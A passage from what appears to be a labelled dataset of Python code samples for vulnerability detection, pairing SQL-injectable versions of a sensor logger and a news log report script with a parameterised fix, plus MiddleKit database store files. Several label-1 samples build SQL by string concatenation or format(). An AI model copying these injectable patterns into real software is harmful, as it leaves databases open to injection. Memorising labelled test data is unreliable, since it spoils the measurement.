radio.available():\n\t\twhile radio.available():\n\t\t\tlength = 10\n\t\t\treceive_payload = radio.read(length)\n\t\t\tvalues = unpack('hhhhh',receive_payload)\n\t\t\tprint \"Node Number: \"+str(values[0])+\"\\nLight: \"+str(values[1])+\" Humidity: \"+str(values[2])+\" Temperature: \"+str(values[3])+\" MQ6: \"+str(values[4])\n\t\t\t#TIMESTAMPT = \"(%s)\",(datetime.now(),)\n\t\t\tLOG=\"INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)\tVALUES(\"+str(values[1])+\",\"+str(values[2])+\",\"+str(values[3])+\",\"+str(values[4])+\",('%s'),('%s'),1);\" % (datetime.now(),datetime.now(),)\n\t\t\twrite_to_db(LOG)\n\ndef write_to_db(LOG):\n\ttry:\n\t\tcon = psycopg2.connect(database='dname', user='uname', password='pass')\n\t\tcon.cursor().execute(LOG)\n\t\tcon.commit()\n\texcept psycopg2.DatabaseError, e:\n\t\tprint 'Error %s' % e\n\t\tsys.exit(1)\n\npipes = [\"0Node\", \"1Node\"]\nradio.begin()\nradio.setRetries(15,15)\nradio.printDetails()\n\nradio.openWritingPipe(pipes[1])\nradio.openReadingPipe(1,pipes[0])\nradio.startListening()\n\nwhile 1:\n\tget_data_from_node()\n\ttime.sleep(0.1)\n/n/n/n", "label": 1}, {"id": "20fefbde3738088586a3c5679f743493d0a504f6", "code": "news_data_analysis.py/n/n#!/usr/bin/env python3\nimport psycopg2\nfrom psycopg2 import sql\n\n\ndef get_top_articles(cur, limit):\n    \"\"\"Fetches the top articles.\n\n    Fetches the number of top articles in the specified\n    order.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        limit(int): The number of rows to view.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    data = (limit, )\n    query = '''SELECT articles.title, COUNT(*) as views\n            FROM log, articles\n            WHERE log.path = '/article/'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY articles.title\n            ORDER BY views DESC\n            LIMIT %s'''\n    rows = get_data(cur, query, data)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_articles_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"\\\"{}\\\" - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_top_authors(cur):\n    \"\"\"Fetches the top authors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    data = ()\n    query = '''SELECT authors.name, COUNT(*) as views\n            FROM authors, articles, log\n            WHERE authors.id = articles.author AND\n            log.path = '/article/'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY authors.name\n            ORDER BY COUNT(*) DESC'''\n    rows = get_data(cur, query, data)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_authors_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_error_days(cur, error_percent):\n    \"\"\"Fetches the days in which requests led to errors.\n\n    Fetches the days in which the specified percentage\n    of requests led to errors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        error_percent(int): The percentage of requests that led to errors.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    data = (error_percent, )\n    query = '''SELECT to_char(log_errors.date, 'Mon DD YYYY'),\n            round((log_errors.errors * 100\n            / log_requests.total::numeric), 2) as percent\n            FROM log_errors, log_requests\n            WHERE log_errors.date = log_requests.date AND\n            log_errors.errors * 100\n            / log_requests.total::numeric > %s\n            ORDER BY log_errors.date'''\n    rows = get_data(cur, query, data)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"error_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {}% errors \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_data(cur, query, data):\n    \"\"\"Fetches the data specified in the query.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        query(str): The query to execute.\n        data(tuple): The values to insert into the query.\n\n    Return:\n        The data or None if there is an error.\n    \"\"\"\n    try:\n        cur.execute(query, data)\n        return cur.fetchall()\n    except psycopg2.Error as e:\n        print(e)\n        cur.connection.rollback()\n        return None\n\n\ndef setup_connection(db_name):\n    \"\"\"Sets up the database connection.\n\n    Sets up a Postgre database connection with passed in\n    database's name.\n\n    Args:\n        db_name(str): The name of the database to connect to.\n\n    Returns:\n        A cursor to the database.\n    \"\"\"\n    try:\n        return psycopg2.connect(dbname=db_name)\n    except psycopg2.Error as e:\n        print(e)\n\n\ndef main():\n    \"\"\"Main function to run the code.\"\"\"\n    conn = setup_connection(\"news\")\n\n    if conn is not None:\n        cur = conn.cursor()\n        # Create top articles report.\n        if get_top_articles(cur, 3):\n            print(\"Successful creating top articles report.\")\n        else:\n            print(\"Error creating top articles report.\")\n        # Create top authors report.\n        if get_top_authors(cur):\n            print(\"Successful creating top authors report.\")\n        else:\n            print(\"Error creating top authors report.\")\n        # Create error report.\n        if get_error_days(cur, 1):\n            print(\"Successful creating daily error percentage report.\")\n        else:\n            print(\"Error creating daily error percentage report.\")\n\n        conn.close()\n\nif __name__ == '__main__':\n    main()\n/n/n/n", "label": 0}, {"id": "20fefbde3738088586a3c5679f743493d0a504f6", "code": "/news_data_analysis.py/n/n#!/usr/bin/env python3\nimport psycopg2\n\n\ndef get_top_articles(cur, order, limit):\n    \"\"\"Fetches the top articles.\n\n    Fetches the number of top articles in the specified\n    order.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        order(str): The order to view the rows in.\n        limit(int): The number of rows to view.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT articles.title, COUNT(*) as views\n            FROM log, articles\n            WHERE log.path LIKE '%'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY articles.title\n            ORDER BY views {}\n            LIMIT {}'''.format(order, limit)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_articles_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"\\\"{}\\\" - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_top_authors(cur, order):\n    \"\"\"Fetches the top authors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        order(str): The order to view the rows in.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT authors.name, COUNT(*) as views\n            FROM authors, articles, log\n            WHERE authors.id = articles.author AND\n            log.path LIKE '%'||articles.slug AND\n            log.method = 'GET'\n            GROUP BY authors.name\n            ORDER BY views {}'''.format(order)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"top_authors_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {} views \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_error_days(cur, error_percent):\n    \"\"\"Fetches the days in which requests led to errors.\n\n    Fetches the days in which the specified percentage\n    of requests led to errors.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        error_percent(int): The percentage of requests that led to errors.\n\n    Return:\n        True if success, False otherwise.\n    \"\"\"\n    query = '''SELECT to_char(log_errors.date, 'Mon DD YYYY'),\n            round((log_errors.errors * 100\n            / log_requests.total::numeric), 2) as percent\n            FROM log_errors, log_requests\n            WHERE log_errors.date = log_requests.date AND\n            log_errors.errors * 100\n            / log_requests.total::numeric > {}\n            ORDER BY log_errors.date'''.format(error_percent)\n    rows = get_data(cur, query)\n\n    # Write data to txt file.\n    if rows is not None:\n        file = open(\"error_report.txt\", \"w\")\n        for row in rows:\n            file.write(\"{} - {}% errors \\n\".format(row[0], row[1]))\n        file.close()\n\n        return True\n    else:\n        return False\n\n\ndef get_data(cur, query):\n    \"\"\"Fetches the data specified in the query.\n\n    Args:\n        cur(obj): The cursor to execute the query.\n        query(str): The query to execute.\n\n    Return:\n        The data or None if there is an error.\n    \"\"\"\n    try:\n        cur.execute(query)\n        return cur.fetchall()\n    except psycopg2.Error:\n        cur.connection.rollback()\n        return None\n\n\ndef setup_connection(db_name):\n    \"\"\"Sets up the database connection.\n\n    Sets up a Postgre database connection with passed in\n    database's name.\n\n    Args:\n        db_name(str): The name of the database to connect to.\n\n    Returns:\n        A cursor to the database.\n    \"\"\"\n    try:\n        return psycopg2.connect(dbname=db_name)\n    except psycopg2.Error as e:\n        print(e)\n\n\ndef main():\n    \"\"\"Main function to run the code.\"\"\"\n    conn = setup_connection(\"news\")\n\n    if conn is not None:\n        cur = conn.cursor()\n        # Create top articles report.\n        if get_top_articles(cur, \"DESC\", 3):\n            print(\"Successful creating top articles report.\")\n        else:\n            print(\"Error creating top articles report.\")\n        # Create top authors report.\n        if get_top_authors(cur, \"DESC\"):\n            print(\"Successful creating top authors report.\")\n        else:\n            print(\"Error creating top authors report.\")\n        # Create error report.\n        if get_error_days(cur, 1):\n            print(\"Successful creating daily error percentage report.\")\n        else:\n            print(\"Error creating daily error percentage report.\")\n\n        conn.close()\n\nmain()\n/n/n/n", "label": 1}, {"id": "23414a49db38c1a34097fe5682223b4e8c3518a9", "code": "MiddleKit/Run/MySQLObjectStore.py/n/nimport new\n\nimport MySQLdb\nfrom MySQLdb import Warning\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass MySQLObjectStore(SQLObjectStore):\n    \"\"\"MySQLObjectStore implements an object store backed by a MySQL database.\n\n    MySQL notes:\n      * MySQL home page: http://www.mysql.com.\n      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27\n      * The platforms developed and tested with include Linux (Mandrake 7.1)\n        and Windows ME.\n      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb\n        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.\n      * Newer versions of MySQLdb have autocommit switched off by default.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n      - autocommit\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n\n    See the MySQLdb docs or the DB API 2.0 docs for more information.\n      http://www.python.org/topics/database/DatabaseAPI-2.0.html\n    \"\"\"\n\n    def __init__(self, **kwargs):\n        self._autocommit = kwargs.pop('autocommit', False)\n        SQLObjectStore.__init__(self, **kwargs)\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('db'):\n            args['db'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        conn = self.dbapiModule().connect(**kwargs)\n        if self._autocommit:\n            # MySQLdb 1.2.0 and later disables autocommit by default\n            try:\n                conn.autocommit(True)\n            except AttributeError:\n                pass\n        return conn\n\n    def connect(self):\n        SQLObjectStore.connect(self)\n        if self._autocommit:\n            # Since our autocommit patch above does not get applied to pooled\n            # connections, we have to monkey-patch the pool connection method\n            try:\n                pool = self._pool\n                connection = pool.connection\n            except AttributeError:\n                pass\n            else:\n                def newConnection(self):\n                    conn = self._normalConnection()\n                    try:\n                        conn.autocommit(True)\n                    except AttributeError:\n                        pass\n                    return conn\n                pool._normalConnection = connection\n                pool._autocommit = self._autocommit\n                pool.connection = new.instancemethod(\n                    newConnection, pool, pool.__class__)\n\n    def retrieveLastInsertId(self, conn, cur):\n        try:\n            # MySQLdb module 1.2.0 and later\n            lastId = conn.insert_id()\n        except AttributeError:\n            # MySQLdb module 1.0.0 and earlier\n            lastId = cur.insert_id()\n        # The above is more efficient than this:\n        # conn, cur = self.executeSQL('select last_insert_id();', conn)\n        # id = cur.fetchone()[0]\n        return lastId\n\n    def dbapiModule(self):\n        return MySQLdb\n\n    def _executeSQL(self, cur, sql, clausesArgs=None):\n        try:\n            cur.execute(sql, clausesArgs)\n        except MySQLdb.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def sqlNowCall(self):\n        return 'NOW()'\n\n\n# Mixins\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"MySQL provides a quoting function for string -- this method uses it.\"\"\"\n        return \"'\" + MySQLdb.escape_string(value) + \"'\"\n/n/n/nMiddleKit/Run/PostgreSQLObjectStore.py/n/n\nconnectionPool = True\ntry:\n    import psycopg2 as dbi  # psycopg2 version 2\n    from psycopg2 import Warning, DatabaseError\n    from psycopg2.extensions import QuotedString\nexcept ImportError:\n    try:\n        import psycopg as dbi  # psycopg version 1\n        from psycopg import Warning, DatabaseError\n        from psycopg.extensions import QuotedString\n    except ImportError:\n        connectionPool = False\n        import pgdb as dbi  # PyGreSQL\n        from pgdb import Warning, DatabaseError\n        def QuotedString(s):\n            return \"'%s'\" % s.replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"''\")\n\nfrom MiscUtils import NoDefault\nfrom MiscUtils.MixIn import MixIn\nfrom MiddleKit.Run.ObjectKey import ObjectKey\nfrom MiddleObject import MiddleObject\n\nfrom SQLObjectStore import SQLObjectStore, UnknownSerialNumberError\n\n\nclass PostgreSQLObjectStore(SQLObjectStore):\n    \"\"\"PostgresObjectStore implements an object store backed by a PostgreSQL database.\n\n    The connection arguments passed to __init__ are:\n      - host\n      - user\n      - passwd\n      - port\n      - unix_socket\n      - client_flag\n\n    You wouldn't use the 'db' argument, since that is determined by the model.\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        args = self._dbArgs.copy()\n        self.augmentDatabaseArgs(args)\n        return self.dbapiModule().connect(**args)\n\n    if connectionPool:\n\n        # psycopg doesn't seem to work well with DBPool. Besides, it does\n        # its own connection pooling internally, so DBPool is unnecessary.\n\n        def setting(self, name, default=NoDefault):\n            if name == 'SQLConnectionPoolSize':\n                return 0\n            return SQLObjectStore.setting(self, name, default)\n\n        # psycopg doesn't like connections to be closed because of pooling\n\n        def doneWithConnection(self, conn):\n            pass\n\n    def newCursorForConnection(self, conn, dictMode=False):\n        return conn.cursor()\n\n    def retrieveNextInsertId(self, klass):\n        seqname = \"%s_%s_seq\" % (klass.name(), klass.sqlSerialColumnName())\n        conn, curs = self.executeSQL(\"select nextval('%s')\" % seqname)\n        value = curs.fetchone()[0]\n        assert value, \"Didn't get next id value from sequence\"\n        return value\n\n    def dbapiModule(self):\n        return dbi\n\n    def _executeSQL(self, cur, sql, clausesArgs=None):\n        try:\n            cur.execute(sql, clausesArgs)\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n\n    def saveChanges(self):\n        conn, cur = self.connectionAndCursor()\n        try:\n            SQLObjectStore.saveChanges(self)\n        except DatabaseError:\n            conn.rollback()\n            raise\n        except Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                conn.rollback()\n                raise\n        conn.commit()\n\n    def sqlCaseInsensitiveLike(self, a, b):\n        return \"%s ilike %s\" % (a, b)\n\n    def sqlNowCall(self):\n        return 'now()'\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        \"\"\"psycopg provides a quoting function for string -- use it.\"\"\"\n        return \"%s\" % QuotedString(value)\n\n\nclass BoolAttr(object):\n\n    def sqlForNonNone(self, value):\n        if value:\n            return 'TRUE'\n        else:\n            return 'FALSE'\n/n/n/nMiddleKit/Run/SQLObjectStore.py/n/nimport sys\n\nfrom MiddleObject import MiddleObject\nfrom ObjectStore import ObjectStore, UnknownObjectError\nfrom ObjectKey import ObjectKey\nfrom MiddleKit.Core.ObjRefAttr import objRefJoin, objRefSplit\nfrom MiscUtils import NoDefault, AbstractError, CSVJoiner\nfrom MiscUtils import Funcs as funcs\nfrom MiscUtils.DBPool import DBPool\nfrom MiscUtils.MixIn import MixIn\n\n\nclass SQLObjectStoreError(Exception):\n    \"\"\"SQL object store error\"\"\"\n\nclass SQLObjectStoreThreadingError(SQLObjectStoreError):\n    \"\"\"SQL object store threading error\"\"\"\n\nclass ObjRefError(SQLObjectStoreError):\n    \"\"\"SQL object store object reference error\"\"\"\n\nclass ObjRefZeroSerialNumError(ObjRefError):\n    \"\"\"SQL object store serial number zero error\"\"\"\n\nclass ObjRefDanglesError(ObjRefError):\n    \"\"\"SQL object store object dangles error\"\"\"\n\n\naggressiveGC = False\n\n\nclass UnknownSerialNumberError(SQLObjectStoreError):\n    \"\"\"For internal use when archiving objects.\n\n    Sometimes an obj ref cannot be immediately resolved on INSERT because\n    the target has not yet been inserted and therefore, given a serial number.\n    \"\"\"\n\n    def __init__(self, info):\n        self.info = info\n\n    def __repr__(self):\n        return '%s: %s' % (self.__class__.__name__, self.info)\n\n    def __str__(self):\n        return str(self.info)\n\n\nclass UnknownSerialNumInfo(object):\n    \"\"\"For internal use when archiving objects.\n\n    Attrs assigned externally are:\n        sourceObject\n        sourceAttr\n        targetObject\n    \"\"\"\n\n    def updateStmt(self):\n        assert self.sourceObject.serialNum() != 0\n        assert self.targetObject.serialNum() != 0\n        sourceKlass = self.sourceObject._mk_klass\n        assert sourceKlass\n        sourceTableName = sourceKlass.sqlTableName()\n        sourceSqlSerialName = sourceKlass.sqlSerialColumnName()\n        return 'update %s set %s where %s=%s;' % (\n            sourceTableName, self.sourceAttr.sqlUpdateExpr(self.targetObject),\n            sourceSqlSerialName, self.sourceObject.serialNum())\n\n    def __repr__(self):\n        s = []\n        for item in self.__dict__.items():\n            s.append('%s=%r' % item)\n        s = ' '.join(s)\n        return '<%s %s>' % (self.__class__.__name__, s)\n\n\nclass SQLObjectStore(ObjectStore):\n    \"\"\"The MiddleKit SQL Object Store.\n\n    TO DO:\n\n      * _sqlEcho should be accessible via a config file setting\n        as stdout, stderr or a filename.\n\n    For details on DB API 2.0, including the thread safety levels see:\n        http://www.python.org/topics/database/DatabaseAPI-2.0.html\n    \"\"\"\n\n\n    ## Init ##\n\n    def __init__(self, **kwargs):\n        # @@ 2001-02-12 ce: We probably need a dictionary before kwargs\n        # for subclasses to pass to us in case they override __init__()\n        # and end up collecting kwargs themselves\n        ObjectStore.__init__(self)\n        self._dbArgs = kwargs\n        self._connected = False\n        self._commited = False\n        self._sqlEcho = None\n        self._sqlCount = 0\n        self._pool = None  # an optional DBPool\n\n    def modelWasSet(self):\n        \"\"\"Perform additional set up of the store after the model is set.\n\n        Performs additional set up of the store after the model is set, normally\n        via setModel() or readModelFileNamed(). This includes checking that\n        threading conditions are valid, and connecting to the database.\n        \"\"\"\n        ObjectStore.modelWasSet(self)\n\n        # Check thread safety\n        self._threadSafety = self.threadSafety()\n        if self._threaded and self._threadSafety == 0:\n            raise SQLObjectStoreThreadingError('Threaded is True,'\n                ' but the DB API threadsafety is 0.')\n\n        # Cache some settings\n        self._markDeletes = self.setting('DeleteBehavior', 'delete') == 'mark'\n\n        # Set up SQL echo\n        self.setUpSQLEcho()\n\n        # Set up attrs for caching\n        for klass in self.model().allKlassesInOrder():\n            klass._getMethods = {}\n            klass._setMethods = {}\n            for attr in klass.allDataAttrs():\n                attr._sqlColumnName = None\n                attr._sqlColumnNames = None\n\n        # use dbargs from settings file as defaults\n        # (args passed to __init__ take precedence)\n        args = self._dbArgs\n        self._dbArgs = self.setting('DatabaseArgs', {})\n        self._dbArgs.update(args)\n        # print 'dbArgs = %s' % self._dbArgs\n\n        # Connect\n        self.connect()\n\n    def setUpSQLEcho(self):\n        \"\"\"Set up the SQL echoing/logging for the store.\n\n        The logging is set up according to the setting 'SQLLog'.\n\n        See the User's Guide for more info. Invoked by modelWasSet().\n        \"\"\"\n        setting = self.setting('SQLLog', None)\n        if setting is None or setting == {}:\n            self._sqlEcho = None\n        else:\n            filename = setting['File']\n            if filename is None:\n                self._sqlEcho = None\n            elif filename == 'stdout':\n                self._sqlEcho = sys.stdout\n            elif filename == 'stderr':\n                self._sqlEcho = sys.stderr\n            else:\n                mode = setting.get('Mode', 'write')\n                assert mode in ['write', 'append']\n                mode = mode[0]\n                self._sqlEcho = open(filename, mode)\n\n\n    ## Connecting to the db ##\n\n    def isConnected(self):\n        return self._connected\n\n    def connect(self):\n        \"\"\"Connect to the database.\n\n        Connects to the database only if the store has not already and provided\n        that the store has a valid model.\n\n        The default implementation of connect() is usually sufficient provided\n        that subclasses have implemented newConnection().\n        \"\"\"\n        assert self._model, 'Cannot connect:' \\\n            ' No model has been attached to this store yet.'\n        if not self._connected:\n            self._connection = self.newConnection()\n            self._connected = True\n            self.readKlassIds()\n            poolSize = self.setting('SQLConnectionPoolSize', 0)\n            if poolSize:\n                args = self._dbArgs.copy()\n                self.augmentDatabaseArgs(args, pool=True)\n                try:\n                    self._pool = DBPool(self.dbapiModule(), poolSize, **args)\n                except TypeError:\n                    if 'database' in args:\n                        del args['database']\n                        self._pool = DBPool(self.dbapiModule(), poolSize, **args)\n                    else:\n                        raise\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        # give subclasses the opportunity to add or change\n        # database arguments\n        pass\n\n    def newConnection(self):\n        \"\"\"Return a DB API 2.0 connection.\n\n        This is a utility method invoked by connect(). Subclasses should\n        implement this, making use of self._dbArgs (a dictionary specifying\n        host, username, etc.) as well as self._model.sqlDatabaseName().\n\n        Subclass responsibility.\n        \"\"\"\n        raise AbstractError(self.__class__)\n\n    def readKlassIds(self):\n        \"\"\"Read the klass ids from the SQL database. Invoked by connect().\"\"\"\n        conn, cur = self.executeSQL('select id, name from _MKClassIds;')\n        try:\n            klassesById = {}\n            for klassId, name in cur.fetchall():\n                assert klassId, 'Id must be a non-zero int.' \\\n                    ' id=%r, name=%r' % (klassId, name)\n                try:\n                    klass = self._model.klass(name)\n                except KeyError:\n                    filename = self._model.filename()\n                    msg = ('%s  The database has a class id for %r in the'\n                        ' _MKClassIds table, but no such class exists in'\n                        ' the model %s. The model and the db are not in sync.'\n                        % (name, name, filename))\n                    raise KeyError(msg)\n                klassesById[klassId] = klass\n                klass.setId(klassId)\n        finally:\n            self.doneWithConnection(conn)\n        self._klassesById = klassesById\n\n\n    ## Changes ##\n\n    def commitInserts(self, allThreads=False):\n        unknownSerialNums = []\n        # @@ ... sort here for dependency order\n        for obj in self._newObjects.items(allThreads):\n            self._insertObject(obj, unknownSerialNums)\n        conn = None\n        try:\n            for unknownInfo in unknownSerialNums:\n                stmt = unknownInfo.updateStmt()\n                conn, cur = self.executeSQL(stmt, conn)\n        finally:\n            self.doneWithConnection(conn)\n        self._newObjects.clear(allThreads)\n\n    def _insertObject(self, obj, unknownSerialNums):\n        # New objects not in the persistent store have serial numbers less than 1\n        if obj.serialNum() > 0:\n            try:\n                rep = repr(obj)\n            except Exception:\n                rep = '(repr exception)'\n            assert obj.serialNum() < 1, 'obj=%s' % rep\n\n        # try to get the next ID (if database supports this)\n        idNum = self.retrieveNextInsertId(obj.klass())\n\n        # SQL insert\n        sql = obj.sqlInsertStmt(unknownSerialNums, idNum)\n        conn, cur = self.executeSQL(sql)\n        try:\n            # Get new id/serial num\n            if idNum is None:\n                idNum = self.retrieveLastInsertId(conn, cur)\n\n            # Update object\n            obj.setSerialNum(idNum)\n            obj.setKey(ObjectKey().initFromObject(obj))\n            obj.setChanged(False)\n\n            # Update our object pool\n            self._objects[obj.key()] = obj\n        finally:\n            self.doneWithConnection(conn)\n\n    def retrieveNextInsertId(self, klass):\n        \"\"\"Return the id for the next new object of this class.\n\n        Databases which cannot determine the id until the object has been\n        added return None, signifying that retrieveLastInsertId\n        should be called to get the id after the insert has been made.\n        \"\"\"\n        return None\n\n    def retrieveLastInsertId(self, conn, cur):\n        \"\"\"Return the id of the last INSERT operation by this connection.\n\n        This id is typically a 32-bit int. Used by commitInserts() to get\n        the correct serial number for the last inserted object.\n        \"\"\"\n        return cur.lastrowid\n\n    def commitUpdates(self, allThreads=False):\n        conn = None\n        try:\n            for obj in self._changedObjects.values(allThreads):\n                sql = obj.sqlUpdateStmt()\n                conn, cur = self.executeSQL(sql, conn)\n                obj.setChanged(False)\n        finally:\n            self.doneWithConnection(conn)\n        self._changedObjects.clear(allThreads)\n\n    def commitDeletions(self, allThreads=False):\n        conn = None\n        try:\n            for obj in self._deletedObjects.items(allThreads):\n                sql = obj.sqlDeleteStmt()\n                conn, cur = self.executeSQL(sql, conn)\n                conn.commit()\n        finally:\n            self.doneWithConnection(conn)\n        self._deletedObjects.clear(allThreads)\n\n\n    ## Fetching ##\n\n    def fetchObject(self, aClass, serialNum, default=NoDefault):\n        \"\"\"Fetch a single object of a specific class and serial number.\n\n        aClass can be a Klass object (from the MiddleKit object model),\n        the name of the class (e.g., a string) or a Python class.\n        Raises an exception if aClass parameter is invalid, or the object\n        cannot be located.\n        \"\"\"\n        klass = self._klassForClass(aClass)\n        objects = self.fetchObjectsOfClass(klass, serialNum=serialNum, isDeep=False)\n        count = len(objects)\n        if count == 0:\n            if default is NoDefault:\n                raise UnknownObjectError('aClass = %r, serialNum = %r'\n                    % (aClass, serialNum))\n            else:\n                return default\n        else:\n            assert count == 1\n            return objects[0]\n\n    def fetchObjectsOfClass(self, aClass,\n            clauses='', isDeep=True, refreshAttrs=True, serialNum=None, clausesArgs=None):\n        \"\"\"Fetch a list of objects of a specific class.\n\n        The list may be empty if no objects are found.\n\n        aClass can be a Klass object (from the MiddleKit object model),\n        the name of the class (e.g., a string) or a Python class.\n\n        The clauses argument can be any SQL clauses such as 'where x<5 order by x'.\n        Obviously, these could be specific to your SQL database, thereby making\n        your code non-portable. Use your best judgement.\n\n        serialNum can be a specific serial number if you are looking for\n        a specific object. If serialNum is provided, it overrides the clauses.\n\n        You should label all arguments other than aClass:\n            objs = store.fetchObjectsOfClass('Foo', clauses='where x<5')\n        The reason for labeling is that this method is likely to undergo\n        improvements in the future which could include additional arguments.\n        No guarantees are made about the order of the arguments except that\n        aClass will always be the first.\n        Raises an exception if aClass parameter is invalid.\n        \"\"\"\n        klass = self._klassForClass(aClass)\n\n        # Fetch objects of subclasses first, because the code below\n        # will be  modifying clauses and serialNum\n        deepObjs = []\n        if isDeep:\n            for subklass in klass.subklasses():\n                deepObjs.extend(self.fetchObjectsOfClass(\n                    subklass, clauses, isDeep, refreshAttrs, serialNum, clausesArgs))\n\n        # Now get objects of this exact class\n        objs = []\n        if not klass.isAbstract():\n            fetchSQLStart = klass.fetchSQLStart()\n            className = klass.name()\n            if serialNum is not None:\n                serialNum = int(serialNum)  # make sure it's a valid int\n                clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)\n            if self._markDeletes:\n                clauses = self.addDeletedToClauses(clauses)\n            conn, cur = self.executeSQL(fetchSQLStart + clauses + ';', commit=False, clausesArgs=clausesArgs)\n            try:\n                for row in cur.fetchall():\n                    serialNum = row[0]\n                    key = ObjectKey().initFromClassNameAndSerialNum(className, serialNum)\n                    obj = self._objects.get(key)\n                    if obj is None:\n                        pyClass = klass.pyClass()\n                        obj = pyClass()\n                        assert isinstance(obj, MiddleObject), (\n                            'Not a MiddleObject. obj = %r, type = %r, MiddleObject = %r'\n                                % (obj, type(obj), MiddleObject))\n                        obj.readStoreData(self, row)\n                        obj.setKey(key)\n                        self._objects[key] = obj\n                    else:\n                        # Existing object\n                        if refreshAttrs:\n                            obj.readStoreData(self, row)\n                    objs.append(obj)\n            finally:\n                self.doneWithConnection(conn)\n        objs.extend(deepObjs)\n        return objs\n\n    def refreshObject(self, obj):\n        assert obj.store() is self\n        return self.fetchObject(obj.klass(), obj.serialNum())\n\n\n    ## Klasses ##\n\n    def klassForId(self, id):\n        return self._klassesById[id]\n\n\n    ## Self utility for SQL, connections, cursors, etc. ##\n\n    def executeSQL(self, sql, connection=None, commit=False, clausesArgs=None):\n        \"\"\"Execute the given SQL.\n\n        This will connect to the database for the first time if necessary.\n        This method will also log the SQL to self._sqlEcho, if it is not None.\n        Returns the connection and cursor used and relies on connectionAndCursor()\n        to obtain these. Note that you can pass in a connection to force a\n        particular one to be used and a flag to commit immediately.\n        \"\"\"\n        sql = str(sql)  # Excel-based models yield Unicode strings which some db modules don't like\n        sql = sql.strip()\n        if aggressiveGC:\n            import gc\n            assert gc.isenabled()\n            gc.collect()\n        self._sqlCount += 1\n        if self._sqlEcho:\n            timestamp = funcs.timestamp()['pretty']\n            self._sqlEcho.write('SQL %04i. %s %s\\n' % (self._sqlCount, timestamp, sql))\n            self._sqlEcho.flush()\n        conn, cur = self.connectionAndCursor(connection)\n        self._executeSQL(cur, sql, clausesArgs)\n        if commit:\n            conn.commit()\n        return conn, cur\n\n    def _executeSQL(self, cur, sql, clausesArgs=None):\n        \"\"\"Invoke execute on the cursor with the given SQL.\n\n        This is a hook for subclasses that wish to influence this event.\n        Invoked by executeSQL().\n        \"\"\"\n        cur.execute(sql, clausesArgs)\n\n    def executeSQLTransaction(self, transaction, connection=None, commit=True):\n        \"\"\"Execute the given sequence of SQL statements and commit as transaction.\"\"\"\n        if isinstance(transaction, basestring):\n            transaction = [transaction]\n        try:\n            for sql in transaction:\n                if connection:\n                    self.executeSQL(sql, connection)\n                else:\n                    connection, cur = self.executeSQL(sql)\n        except Exception:\n            if connection and commit:\n                connection.rollback()\n            raise\n        if transaction and connection and commit:\n            try:\n                connection.commit()\n            except Exception:\n                connection.rollback()\n                raise\n        return connection\n\n    def executeSQLScript(self, sql, connection=None):\n        \"\"\"Execute the given SQL script.\n\n        This uses the nonstandard executescript() method as provided\n        by the PySQLite adapter.\n        \"\"\"\n        sql = str(sql).strip()\n        if not connection:\n            connection = self.newConnection()\n        if not hasattr(connection, 'executescript'):\n            raise AttributeError(\n                'Script execution not supported by database adapter.')\n        return connection.executescript(sql)\n\n    def setSQLEcho(self, file):\n        \"\"\"Set a file to echo sql statements to, as sent through executeSQL().\n\n        None can be passed to turn echo off.\n        \"\"\"\n        self._sqlEcho = file\n\n    def 